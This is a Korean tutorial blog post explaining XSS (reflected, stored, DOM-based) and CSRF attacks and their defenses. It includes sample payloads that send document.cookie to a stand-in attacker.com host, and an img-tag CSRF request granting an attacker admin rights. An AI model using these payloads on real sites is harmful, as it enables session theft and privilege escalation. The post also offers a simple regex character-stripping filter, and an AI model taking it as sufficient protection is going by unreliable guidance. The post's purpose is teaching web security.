# XSS와 CSRF

웹 개발을 할 때 보안관련 이슈에 대해 한번쯤은 들어봤을 것이다. 그 중에서 다뤄볼 것은 가장 많이 언급되기도 하는 `XSS`, `CSRF`에 대해 살펴보려고 한다.

<br>

## XSS (Cross Site Scripting) 공격

<br>

`XSS`가 무엇일까?

<br>

알아보기 전에 먼저 Cross Site Scripting인데 왜 약어는 XSS일까? 단지, 그 이유는 우리가 잘 알고 있는 `CSS (Cascading Style Sheets)`이미 사용중 이기 때문이다.

XSS는 웹을 공격하는 방법중 하나로써 흔히 사용하는 게시판, 이메일 에서 아주 나쁜 사람이 악성 스크립트 코드를 삽입해서 시스템을 구축한 개발자가 의도하지 않은 기능을 작동시키는 어찌보면 정말 단순하지만 치명적일 수 있는 공격이다.

XSS는 크게 3가지로 나눌 수 있는데 `Reflected XSS` `Stored XSS` `DOM Based XSS`이다. 이것들에 대해 알아보도록 하겠다.

<br>

### Reflected XSS

<br>

`반사 XSS 공격`이라고 한다. 악성 스크립트가 포함된 링크를 사용자가 클릭하도록 유도하는 것이 핵심인데 웹 어플리케이션에서 GET방식으로 조회할 때 사용되는 `Query String` (`weak.com?id=101`) 에 악성 스크립트를 포함시킨다. 그래서 사용자가 그 링크를 클릭하게 되면 그 링크의 URL에 따라서 서버로 요청하고 검색 결과를 응답받은 페이지내에서 악성 스크립트가 실행되도록 하는 공격이다. 보통 사용자의 `세션`, `쿠키`를 `탈취`하여 공격자가 사용자의 권한을 취득한다.

<br>

```
weak.com?id=<script>document.location="https://attacker.com?cookie="+document.cookie</script>
```

<br>

![image](https://user-images.githubusercontent.com/52060742/129577107-919746db-5839-42cd-8148-bbd273cce76f.png)

<br>

하지만 이 방법은 이제 브라우저에서 막을 수 있기 때문에 KISA(한국인터넷진흥원)에서도 더이상 취약점으로 받지 않고 있다고 한다.

<br>

### Stored XSS

<br>

`저장 XSS 공격`이라고 한다. 이름처럼 취약점을 가지고 있는 서버에 악성 스크립트를 저장해 놓는 방법이다. 보통 게시판, 댓글, 쪽지함 등에서 사용하는데 공격자가 악성 스크립트를 포함한 게시글을 작성하면 서버의 DB에 악성 스크립트가 저장된다.

사용자가 그 게시글에 들어감으로써 서버에 게시글을 조회하기 위해 GET 요청을 보내고 서버는 해당 요청에 대해 응답을 보내준다. 그 응답에 악성 스크립트가 포함되어있기 때문에 스크립트가 실행 된다.

```
<script>document.location="https://attacker.com?cookie="+document.cookie</script>
```

<br>

![image](https://user-images.githubusercontent.com/52060742/129577372-3f8fa190-1478-46a9-a452-6e28a98248ae.png)

<br>

### DOM based XSS

<br>

`DOM 기반 XSS 공격`이다. Reflected XSS와 비슷하게 사용자가 악성 스크립트가 포함된 링크를 클릭하도록 유도한다.

브라우저에 DOM을 추가할 수 있는 `innerHTML` 이라는 속성은 사용자가 요청한 값을 가지고 DOM을 동적으로 그릴수있기 때문에 DOM이 렌더링 되면서 악성 스크립트가 실행된다.

<br>

```
weak.com?keyword=<script>document.location="https://attacker.com?cookie="+document.cookie</script>
```

<br>

![image](https://user-images.githubusercontent.com/52060742/129577580-824f2272-78a5-4603-b6c6-ebc656ce17bb.png)

<br>

## XSS 대응방안

<br>

그렇다면 이러한 XSS 공격들을 어떻게 막을 수 있을까? 막을 수 있는 방법은 여러가지가 있고 그 중 몇가지에 대해 설명하겠다.

<br>

### 사용자의 입력, 요청값 제한

예를 들어 weak.com?id=101 처럼 `id`에는 숫자값만 받을 수 있도록 제한하는 것이다. 하지만 이 방법은 검색과 같은 weak.com?search=키워드 처럼 `search` 는 문자열을 받아야 하기 때문에 아직 완전히 막을 수는 없다.

<br>

### 사용자의 입력, 요청값 치환

보통 XSS 공격은 `<script>` 를 사용하여 공격한다. 그래서 태그를 사용하기 위한 문자인 `<` 과 `>` 를 `HTML Entity` 로 치환하고 서버에서 해당 문자를 인코딩 하는 방법이다. (정규표현식을 사용하여 치환할 수도 있다.)

```js
queryString = queryString.replace(/\<|\>|\"|\'|\%|\;|\(|\)|\&|\+|\-/g, '');
```

<br>

### HTML Entity

HTML에는 미리 예약된 문자들이 있다. 이 문자들을 HTML 예약어 라고 한다. 예약어를 HTML코드에서 사용하면 브라우저는 다른 의미로 해석하는데, 이 예약어를 원래의 의미대로 사용하기 위해 별도로 만든 문자셋을 HTML Entity 라고 한다.

| 엔티티 문자 | 엔티티 이름 |
| ----------- | ----------- |
| '공백'      | \&nbsp;     |
| <           | \&lt;       |
| >           | \&gt;       |
| \&          | \&amp;      |
| "           | \&quot;     |

<br>

### HttpOnly 사용

서버에서 `Set-Cookie`로 쿠키를 생성하는데 그 때 HttpOnly 옵션을 사용하면 HTTP 통신 상에서만 사용되어야 한다는 뜻이다. 그렇기 때문에 브라우저에서 `document.cookie`로는 직접 쿠키정보를 얻을 수 없다.

**쿠키**

```
클라이언트의 상태 정보를 가지고 있는 key-value 쌍으로 구성되어 있는 데이터이다. 브라우저 내부에 저장되어 있음
```

```jsx
response.writeHead(200, {
  'Set-Cookie': [
    'yummy_cookie=choco',
    'tasty_cookie=strawberry',
    `Permanent=cookies; Max-Age=${60 * 60 * 24 * 30}`,
    'Secure=Secure; Secure',
    'sid=A3209EWLCVBN38SDJKA82398DJ; HttpOnly',
  ],
});
```

<br>

### XSS 필터 라이브러리 사용

서버에서 XSS 공격을 방어하기위한 별도 라이브러리를 사용한다. 네이버에서 개발한 `Lucy-Xss-Servlet-Filter` 등등..

<br>

## CSRF (Cross Site Request Forgery) 공격

<br>

`CSRF`는 직역하면 사이트 간 요청 위조 이다. 요청 위조라고 일컫는 이유는 공격자가 일반 사용자의 권한을 도용하여 공격자가 원하는 공격을 사용자 자신도 모르게 행하기 때문이다. 그럼 공격자가 어떻게 공격하는지 간단한 예시로 알아보자.

피해자 K씨는 `weak.com` 의 관리자 권한을 가지고 있는 사람이고, 로그인 한 상태이다. `weak.com`에는 관리자가 각 사용자들의 권한을 변경할 수 있는데 그 HTTP 메소드가 다음과 같다.

```
GET /changeAuth?userId=attacker&auth=ADMIN
```

공격자가 HTTP 메소드를 알고 있고, weak.com을 사용하는 사람들에게 무작위로 마구 메일을 전송하는데 그 메일에는 다음과 같은 내용이 포함되어 있다.

```html
<img src="https://weak.com/changeAuth?userId=attacker&auth=ADMIN" />
```

관리자 권한으로 로그인 한 사람이 해당 메일을 읽는 순간 img 태그에서 이미지를 받아오기 위해 공격자가 지정한 src에 권한을 바꾸는 changeAuth 요청을 하게 되고 공격자는 어드민 권한을 얻게된다.

<br>

## 대응방안

<br>

CSRF 공격을 막을 수 있는 방법 몇가지에 대해 설명하겠다.

### CAPTCHA 사용

captcha를 통해 인증하지 않거나 실패하면 요청을 할 수 없게 하는 것 그렇기 때문에 사용자 자기도 모르게 공격하는 것을 방지할 수 있다.

![image](https://user-images.githubusercontent.com/52060742/129579138-a32d73a2-8e01-4c6e-b9b1-6d24323f42cb.png)

<br>

### CSRF Token 사용

서버에서는 사용자가 어떤 뷰(화면)를 보기위해 요청할 때 마다 매번 랜덤으로 Token을 생성하여 사용자의 세션에 저장해 두고, 화면에는 아래와 같이 숨겨둔다.

```html
<input type="hidden" name="_csrf" value="${CSRF_TOKEN}" />
```

그 후 사용자로부터 어떤 요청이 발생했을 때 숨겨져 있던 CSRF Token과 서버의 세션에 있던 Token 값을 비교하여 동일할 경우에만 요청을 허용하도록 하고, Token이 동일해서 요청에 성공했으면 그 Token은 바로 폐기한다. 만약 Token이 없거나, 다르면 요청을 허용하지 않고 메인화면으로 리다이렉트 시켜버려도 된다.

<br>

```
Session

세션은 쿠키를 기반으로 하고 있지만 쿠키와 가장 큰 차이점은
저장하고 있는 위치이다. 쿠키는 `브라우저`에 저장하고 있지만
세션은 `서버`에 저장하고 있다.

서버에 저장하고 있기 때문에 쿠키보다 보안은 좋지만 사용자가 많아지면
서버 메모리를 많이 차지한다.

클라이언트가 서버에 접속하면 세션 ID를 발급한다.
클라이언트는 쿠키를 사용하여 세션 ID를 가지고 있는다.
클라이언트가 서버에 요청할 때 마다 세션 ID를 전달한다.
서버에서는 세션 ID로 클라이언트가 누구인지 판별한다.

보통 로그인(인증)에 사용된다.
```

<br>

## XSS, CSRF 차이점

| 항목        | XSS                    | CSRF                                  |
| ----------- | ---------------------- | ------------------------------------- |
| 설명        | 자신의 정보가 유출     | 권한을 가진 사람이 자기도 모르게 공격 |
| 공격의 대상 | 클라이언트(사용자)     | 서버                                  |
| 목적        | 악의적인 스크립트 실행 | 악의적인 행동을 유도                  |
